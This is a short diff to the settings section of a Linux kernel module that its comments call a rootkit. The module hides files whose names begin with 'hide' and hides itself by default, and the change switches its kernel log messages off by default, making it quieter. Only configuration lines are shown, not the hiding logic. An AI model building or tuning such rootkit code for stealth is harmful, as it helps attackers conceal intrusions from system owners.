@@ -19,7 +19,7 @@ MODULE_VERSION("1.0");
 // SETTINGS //
 
 #define NAME_TO_HIDE "hide"	//rootkit will hide files which names are started with NAME_TO_HIDE 
-int show_dmesg = 1;			//initial messaging status (ON/OFF)
+int show_dmesg = 0;			//initial messaging status (ON/OFF)
 int module_hidden = 1;		//initial module status (hidden/unhidden)
 
 enum signals{
